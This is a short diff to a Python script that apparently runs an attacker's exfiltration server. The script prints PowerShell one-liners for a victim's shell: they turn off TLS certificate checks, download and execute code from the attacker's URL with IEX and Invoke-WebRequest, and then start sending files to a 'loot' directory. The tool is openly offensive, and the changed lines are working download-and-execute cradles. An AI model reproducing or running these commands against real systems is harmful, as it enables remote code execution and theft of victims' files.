@@ -283,8 +283,10 @@ def main():
     print(f"URL:      {target_url}\n" 
           f"Password: {args.password}\n"
           f"Loot dir: {args.targetdir}\n")
-    print(f"Copy any of the two into your PowerShell:\n"
-          f"PS > IEX (New-Object Net.WebClient).DownloadString('{target_url}iwe')\n"
+    print("Load into PowerShell via NetWebclient:\n"
+          "PS > [Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n"
+          f"PS > IEX (New-Object Net.WebClient).DownloadString('{target_url}iwe')\n\n"
+          "Load into PowerShell via Invoke-WebRequest:\n"
           f"PS > IWR -SkipCertificateCheck '{target_url}iwe' | IEX \n")
     print("Start exfiltrating files with:\n"
           "PS > ls * | IEX\n")
